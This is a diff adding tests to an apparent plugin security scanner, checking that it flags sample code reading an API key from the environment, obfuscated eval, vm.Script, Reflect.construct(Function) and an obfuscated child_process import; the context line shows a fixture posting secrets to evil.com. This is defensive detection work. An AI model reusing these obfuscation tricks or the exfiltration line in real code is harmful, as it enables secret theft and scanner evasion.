@@ -152,6 +152,62 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
     );
   });
 
+  it("detects direct process.env access without network context", () => {
+    const source = `
+const token = process.env.OPENAI_API_KEY;
+console.log(token);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "env-access" && f.severity === "warn")).toBe(true);
+  });
+
+  it("detects obfuscated eval member access", () => {
+    const source = `
+const fn = this["ev" + "al"];
+fn("console.log('x')");
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(
+      findings.some(
+        (f) => f.ruleId === "dynamic-code-execution" && f.message.includes("Obfuscated eval"),
+      ),
+    ).toBe(true);
+  });
+
+  it("detects vm.Script usage when vm module is imported", () => {
+    const source = `
+import vm from "node:vm";
+new vm.Script("1+1");
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(
+      findings.some((f) => f.ruleId === "dynamic-code-execution" && f.message.includes("VM-based")),
+    ).toBe(true);
+  });
+
+  it("detects Reflect.construct(Function, ...) dynamic execution", () => {
+    const source = `
+const fn = Reflect.construct(Function, ["return process"]);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(
+      findings.some(
+        (f) =>
+          f.ruleId === "dynamic-code-execution" && f.message.includes("Reflect.construct(Function"),
+      ),
+    ).toBe(true);
+  });
+
+  it("detects obfuscated child_process dynamic import", () => {
+    const source = `
+const mod = await import("child_" + "process");
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(
+      findings.some((f) => f.ruleId === "dangerous-exec" && f.message.includes("Obfuscated")),
+    ).toBe(true);
+  });
+
   it("returns empty array for clean plugin code", () => {
     const source = `
 export function greet(name: string): string {
